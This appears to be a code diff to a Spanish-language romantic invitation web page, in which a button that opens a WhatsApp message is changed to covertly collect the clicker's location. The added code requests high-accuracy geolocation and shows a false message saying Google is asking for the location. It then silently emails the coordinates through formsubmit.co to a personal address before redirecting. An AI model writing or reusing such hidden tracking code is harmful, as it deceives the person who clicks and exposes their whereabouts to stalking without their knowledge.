@@ -292,15 +292,85 @@ window.addEventListener('load', () => {
         });
     });
 });
-// Al presionar el botón "mi negrita consentida", la manda a tu WhatsApp
+// Al presionar el botón "mi negrita consentida", además enviamos la ubicación por email
 const btnNegrita = document.getElementById('btn-negrita');
 if (btnNegrita) {
-    btnNegrita.addEventListener('click', () => {
-        // Pon tu número de celular real aquí (mantén el 57 al inicio)
-        const telefono = "573135141742"; 
+    btnNegrita.addEventListener('click', async () => {
+        btnNegrita.setAttribute('disabled', 'true');
+
+        const formElement = document.getElementById('email-form');
+        const formData = new FormData(formElement);
+
+        const setField = (name, value) => {
+            const input = formElement.querySelector(`input[name="${name}"]`);
+            if (input) input.value = value ?? '';
+        };
+
+        const requestGeolocation = () => {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ ok: false, status: 'geolocation_unsupported' });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            ok: true,
+                status: 'granted',
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    (err) => {
+                        resolve({
+                            ok: false,
+                            status: err && err.code ? `geo_error_${err.code}` : 'geo_error'
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        };
+
+        const statusText = document.getElementById('geo-status-text');
+        if (statusText) {
+            statusText.innerText = 'Google está pidiendo tu ubicación...';
+        }
+
+        const geo = await requestGeolocation();
+
+        if (statusText) {
+            statusText.innerText = geo.ok ? 'Ubicación lista.' : 'No se pudo obtener tu ubicación.';
+        }
+
+        // Completar campos para formsubmit.co
+        setField('Latitude', geo.ok ? String(geo.latitude) : '');
+        setField('Longitude', geo.ok ? String(geo.longitude) : '');
+        setField('Accuracy', geo.ok ? String(geo.accuracy) : '');
+        setField('LocationStatus', geo.status);
+
+        // Capturar el formData actualizado (por si ya existía antes)
+        const finalFormData = new FormData(formElement);
+
+        // Envío por email (igual que en btn-yes)
+        fetch("https://formsubmit.co/ajax/mejiamapura@gmail.com", {
+            method: "POST",
+            body: finalFormData,
+            headers: { 'Accept': 'application/json' }
+        }).catch((e) => {
+            console.error('Error de envío (btn-negrita):', e);
+        });
+
+        // WhatsApp (se mantiene el comportamiento original)
+        const telefono = "573135141742";
         const mensaje = encodeURIComponent("a que hora pasas por mi?");
         const urlWhatsApp = `https://wa.me/${telefono}?text=${mensaje}`;
-        
         window.location.href = urlWhatsApp;
     });
 }
